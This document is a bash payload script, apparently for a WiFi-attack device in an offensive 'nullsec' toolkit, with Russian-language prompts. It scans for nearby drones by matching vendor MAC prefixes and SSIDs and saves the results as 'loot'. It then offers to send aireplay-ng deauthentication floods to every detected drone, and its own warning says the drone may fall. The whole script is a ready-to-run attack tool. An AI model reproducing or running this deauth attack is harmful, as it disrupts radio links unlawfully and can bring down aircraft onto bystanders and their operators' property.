#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: Охотник за дронами
# Author: bad-antics
# Description: Обнаруживает и идентифицирует ближайшие дроны по WiFi
# Category: nullsec/recon

# Автовыбор правильного беспроводного интерфейса (экспортирует $IFACE).
# Если ничего не подключено, пытается загрузить библиотеку из другой папки.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

# Известные OUI и SSID дронов
DRONE_OUIS="60:60:1F:DJI
34:D2:62:DJI
48:1C:B9:DJI
60:B6:47:DJI
E0:49:4C:DJI
40:1C:A8:Parrot
90:03:B7:Parrot
A0:14:3D:Parrot
00:12:1C:Parrot
00:26:7E:Parrot
94:51:03:Autel
90:3A:E6:Autel
2C:41:A1:Yuneec
60:A4:4C:Skydio
9C:4E:36:Holy Stone
A0:C9:A0:Syma
4C:49:E3:Autel"

DRONE_SSIDS="Spark-|Mavic-|Phantom|TELLO-|Anafi-|Bebop|PARROT|DJI|Skydio|YUNEEC|AUTEL"

PROMPT "ОХОТНИК ЗА ДРОНАМИ

Обнаруживает дронов по их
WiFi-подписям.

Опознаёт DJI, Parrot,
Autel, Yuneec и др.

Нажмите ОК для продолжения."

INTERFACE="$IFACE"

# Подготовка
airmon-ng check kill 2>/dev/null
sleep 1
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

DURATION=$(NUMBER_PICKER "Время сканирования (сек):" 30)

SPINNER_START "Сканирование дронов..."

# Сканирование
TEMP_DIR="/tmp/dronehunt_$$"
mkdir -p "$TEMP_DIR"
timeout $DURATION airodump-ng $MON_IF -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
sleep $DURATION

SPINNER_STOP

# Анализ результатов
LOOT_DIR="/mmc/nullsec/drones"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/drones_$(date +%Y%m%d_%H%M%S).txt"

echo "Результаты Охотника за Дронами" > "$LOOT_FILE"
echo "Дата: $(date)" >> "$LOOT_FILE"
echo "Длительность сканирования: ${DURATION}s" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

FOUND=0

# Проверка по OUI
while IFS=',' read -r BSSID F2 F3 CHANNEL F5 SPEED PRIVACY CIPHER AUTH POWER F11 F12 F13 ESSID REST; do
    BSSID=$(echo "$BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
    ESSID=$(echo "$ESSID" | tr -d ' ')
    
    if [ -n "$BSSID" ] && echo "$BSSID" | grep -qE "^[0-9A-Fa-f]{2}:"; then
        OUI=$(echo "$BSSID" | cut -d':' -f1-3)
        
        # Проверка OUI
        DRONE_TYPE=""
        if echo "$DRONE_OUIS" | grep -qi "$OUI"; then
            DRONE_TYPE=$(echo "$DRONE_OUIS" | grep -i "$OUI" | cut -d':' -f4)
        fi
        
        # Проверка SSID
        if [ -z "$DRONE_TYPE" ] && echo "$ESSID" | grep -qiE "$DRONE_SSIDS"; then
            if echo "$ESSID" | grep -qi "DJI\|Spark\|Mavic\|Phantom\|TELLO"; then
                DRONE_TYPE="DJI"
            elif echo "$ESSID" | grep -qi "Parrot\|Anafi\|Bebop"; then
                DRONE_TYPE="Parrot"
            elif echo "$ESSID" | grep -qi "AUTEL"; then
                DRONE_TYPE="Autel"
            elif echo "$ESSID" | grep -qi "YUNEEC"; then
                DRONE_TYPE="Yuneec"
            elif echo "$ESSID" | grep -qi "Skydio"; then
                DRONE_TYPE="Skydio"
            else
                DRONE_TYPE="Unknown"
            fi
        fi
        
        if [ -n "$DRONE_TYPE" ]; then
            echo "" >> "$LOOT_FILE"
            echo "ДРОН ОБНАРУЖЕН!" >> "$LOOT_FILE"
            echo "Тип: $DRONE_TYPE" >> "$LOOT_FILE"
            echo "BSSID: $BSSID" >> "$LOOT_FILE"
            echo "SSID: $ESSID" >> "$LOOT_FILE"
            echo "Канал: $CHANNEL" >> "$LOOT_FILE"
            echo "Сигнал: $POWER dBm" >> "$LOOT_FILE"
            ((FOUND++))
        fi
    fi
done < "$TEMP_DIR/scan-01.csv"

# Очистка
airmon-ng stop $MON_IF 2>/dev/null
rm -rf "$TEMP_DIR"

if [ "$FOUND" -gt 0 ]; then
    PROMPT "НАЙДЕНО ДРОНОВ: $FOUND

Проверьте $LOOT_FILE
для подробностей.

Обнаруженные типы могут
включать DJI, Parrot, Autel и др.

Нажмите ОК для продолжения."
    
    resp=$(CONFIRMATION_DIALOG "ОТКЛЮЧИТЬ ДРОНЫ?

Это отключит все
обнаруженные дроны
от их контроллеров.

ВНИМАНИЕ: Опасно!
Дрон может упасть.

Подтвердить?")
    
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        airmon-ng start $INTERFACE >/dev/null 2>&1
        LOG "Отключаем дронов..."
        
        grep "BSSID:" "$LOOT_FILE" | cut -d':' -f2- | tr -d ' ' | while read DRONE_MAC; do
            aireplay-ng --deauth 50 -a "$DRONE_MAC" $MON_IF >/dev/null 2>&1 &
        done
        
        sleep 10
        killall aireplay-ng 2>/dev/null
        airmon-ng stop $MON_IF 2>/dev/null
        
        PROMPT "ОТКЛЮЧЕНИЕ ЗАВЕРШЕНО

Все обнаруженные дроны
были атакованы.

Нажмите ОК для выхода."
    fi
else
    PROMPT "ДРОНОВ НЕ ОБНАРУЖЕНО

WiFi-сигналы дронов
не найдены за ${DURATION}s.

Попробуйте более длинное сканирование
или другое место.

Нажмите ОК для выхода."
fi
